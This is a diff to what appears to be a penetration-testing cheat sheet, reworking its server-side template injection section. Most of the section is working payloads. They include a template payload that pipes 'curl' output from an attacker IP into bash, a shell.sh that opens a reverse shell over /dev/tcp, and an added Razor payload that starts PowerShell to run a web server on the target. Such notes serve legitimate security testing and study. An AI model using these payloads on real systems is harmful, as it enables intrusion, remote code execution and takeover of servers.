@@ -21,7 +21,7 @@
 - [DOM-based vulnerabilities](#dom-based-vulnerabilities)
 - [WebSockets](#websockets)
 - [Insecure deserialization](#insecure-deserialization)
-- [Server-side template injection](#server-side-template-injection)
+- [Server-side template injection](#server-side-template-injection-ssti)
 - [Web cache poisoning](#web-cache-poisoning)
 - [HTTP Host header attacks](#http-host-header-attacks)
 - [HTTP request smuggling](#http-request-smuggling)
@@ -1076,24 +1076,26 @@ Windows Defender might tag the application as virus.
 
 
 
-## Server-side template injection
-- SSTI
+## Server-side template injection (SSTI)
 
-- Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
-- The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
-- Use payloads like these
-  ```
-  {{7*7}}[[3*3]]
-  {{7*7}}
-  {{7*'7'}}
-  <%= 7 * 7 %>
-  ${7*7}
-  ${{7*7}}
-  @(7+7)
-  #{7*7}
-  #{ 7 * 7 }
-  ```
-- test '{{7*7}}', if the result is 49, then we can proceed with more tests
+Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
+
+The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
+
+Some payloads:
+```C#
+{{7*7}}[[3*3]]
+{{7*7}}
+{{7*'7'}}
+<%= 7 * 7 %>
+${7*7}
+${{7*7}}
+@(7+7)
+#{7*7}
+#{ 7 * 7 }
+```
+
+Python
 - try then `{{config}}` and `{{{{{}.__class__.__base__.__subclasses__()}}}}`
 - `python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("curl 192.168.45.237/shell.sh | bash", shell=True, stdout=-1).communicate()[0].decode()}}'`
   - shell.sh
@@ -1101,6 +1103,10 @@ Windows Defender might tag the application as virus.
     bash -i >& /dev/tcp/192.168.118.9/8080 0>&1
     ```
 
+Razor
+- [Server-Side Template Injection (SSTI) in ASP.NET Razor | Clément Notin | Blog](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
+- Payload: `@(191*7)`
+- Open a web server: `@{ var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "powershell"; p.StartInfo.Arguments = "-Command \"Start-Process powershell -ArgumentList 'cd C:\\; python -m http.server 9999'\""; p.Start(); }`
 
 ## Web cache poisoning
 
